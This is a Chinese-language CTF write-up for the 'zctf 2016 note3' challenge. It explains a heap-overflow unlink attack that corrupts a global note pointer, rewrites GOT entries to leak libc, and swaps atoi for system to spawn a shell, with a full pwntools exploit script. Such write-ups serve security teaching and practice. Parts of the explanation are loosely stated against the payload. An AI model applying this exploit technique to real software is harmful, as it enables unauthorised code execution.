# 漏洞成因
## 程序关键结构体
程序使用全局数组管理最多7个note，结构如下：
- `ptr` 数组位于 `0x6020C8`，每个元素8字节，存储note堆指针（`ptr[i]`）。
- `qword_6020C0` 数组位于 `0x6020C0`，其中 `qword_6020C0[0]` 存储最近操作的note指针，`qword_6020C0[i+8]` 存储对应note的大小（i为0~6）。

## 漏洞定位
漏洞位于堆块合并时的unlink操作。通过堆溢出（编辑note0时）可以覆盖相邻chunk的头部信息，构造伪造的空闲chunk。当释放相邻chunk时，会触发向前合并，导致unlink操作，利用伪造的chunk实现任意地址写。

关键代码：在`delete`函数中调用`free`，若被释放chunk的`PREV_INUSE`位为0，则会与前一个chunk合并，触发unlink。
```c
// 删除函数中
free(*(&ptr + v3));
// 若chunk的prev_inuse为0，则合并前一个chunk，执行unlink
```

# 漏洞利用过程：
利用unlink修改全局note指针，从而控制程序流。主要步骤：堆布局构造伪造chunk -> 触发unlink修改全局指针 -> 修改got表泄露libc地址 -> 劫持atoi为system -> 获取shell。

## 堆布局与unlink
- Step1: 创建4个note，note0大小为0（实际分配0x20），note1~3大小为256（实际分配0x110）。为后续溢出和unlink准备。
- Step2: 编辑note0，构造payload覆盖note1的chunk头部，并在note1内部构造伪造的空闲chunk。具体如下：
  - 覆盖note1的`prev_size`为0x121，`size`为0x101（清除`PREV_INUSE`位）。
  - 在note1内部偏移0x100处构造伪造chunk，`size`为0x101，`fd`为`ptr-8`（0x6020C0），`bk`为`ptr`（0x6020C8）。
- Step3: 删除note1，触发unlink。unlink过程中：
  - `FD =伪造chunk->fd = ptr-8`，`BK =伪造chunk->bk = ptr`。
  - 检查：`FD->bk`指向`ptr+0x10`（即`ptr[2]`），`BK->fd`也指向`ptr+0x10`，而伪造chunk地址由`prev_size`计算得到，需满足检查。通过精心构造使检查通过。
  - 执行：`FD->bk = BK` 和 `BK->fd = FD`，最终将`ptr[2]`修改为`ptr-8`（0x6020C0）。

## 控制全局指针与GOT篡改
- Step4: 编辑note2（此时`ptr[2]`指向0x6020C0），写入payload修改全局指针数组：
  - 覆盖`ptr[0]`为`free_got`，`ptr[1]`、`ptr[2]`、`ptr[3]`均为`atoi_got`。
- Step5: 编辑note0（指向`free_got`），将`free_got`改写为`puts_plt`。
- Step6: 删除note2（指向`atoi_got`），实际调用`puts(atoi_got)`，泄露atoi地址，从而计算libc基址和system地址。
- Step7: 编辑note3（指向`atoi_got`），将`atoi_got`改写为`system`地址。

## 触发shell
- Step8: 程序主循环中调用`atoi`读取选项，此时输入`/bin/sh`，实际执行`system("/bin/sh")`，获取shell。

# Exploit：
```python
from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
p = process('./data/bin/heap23_16_zctf_2016_note3')
elf = ELF('./data/bin/heap23_16_zctf_2016_note3')
libc = elf.libc
ptr = 0x6020C8
free_got = elf.got['free']
atoi_got = elf.got['atoi']
puts_plt = elf.plt['puts']

def new(size, content):
    p.recvuntil(b'>>\n')
    p.sendline(b'1')
    p.recvuntil(b'1024)\n')
    p.sendline(size)
    p.recvuntil(b'content:\n')
    p.sendline(content)

def show():
    p.recvuntil(b'>>\n')
    p.sendline(b'2')

def edit(idx, content):
    p.recvuntil(b'>>\n')
    p.sendline(b'3')
    p.recvuntil(b'note:\n')
    p.sendline(idx)
    p.recvuntil(b'content:\n')
    p.sendline(content)

def delete(idx):
    p.recvuntil(b'>>\n')
    p.sendline(b'4')
    p.recvuntil(b'note:\n')
    p.sendline(idx)

# Step1: 堆布局，创建4个note
new(b'0', b'aaaa');new(b'256', b'aaaa');new(b'256', b'aaaa');new(b'256', b'aaaa')

# Step2: 构造伪造chunk，覆盖note1头部
fd = ptr + 0x10 - 0x18  # 0x6020C0
bk = ptr + 0x10 - 0x10  # 0x6020C8
# payload结构：覆盖note1的prev_size为0x121，size为0x101，并在note1内部0x100处构造伪造chunk
payload = p64(0) * 3 + p64(0x121) + b'a' * 0x110 + p64(0) + p64(0x101) + p64(fd) + p64(bk) + b'a' * (0x100-0x20) + p64(0x100) + p64(0x110)
edit(b'0', payload)

# Step3: 删除note1，触发unlink，将ptr[2]修改为0x6020C0
delete(b'1')

# Step4: 编辑note2（指向0x6020C0），修改全局指针数组
payload = b'a' * 0x8 + p64(free_got) + p64(atoi_got) + p64(atoi_got) + p64(atoi_got)
edit(b'2', payload)

# Step5: 编辑note0（指向free_got），将free_got改为puts_plt
edit(b'0', p64(puts_plt)[:-1])  # 避免截断，少写一字节

# Step6: 删除note2（指向atoi_got），实际调用puts(atoi_got)泄露地址
delete(b'2')
atoi_addr = u64(p.recvline()[:-1].ljust(8, b'\x00'))
libc_addr = atoi_addr - libc.symbols['atoi']
system_addr = libc.symbols['system'] + libc_addr

# Step7: 编辑note3（指向atoi_got），将atoi_got改为system
edit(b'3', p64(system_addr)[:-1])

# Step8/9: 触发system("/bin/sh")
p.recvuntil(b'>>\n')
p.sendline(b'/bin/sh')
p.interactive()
```
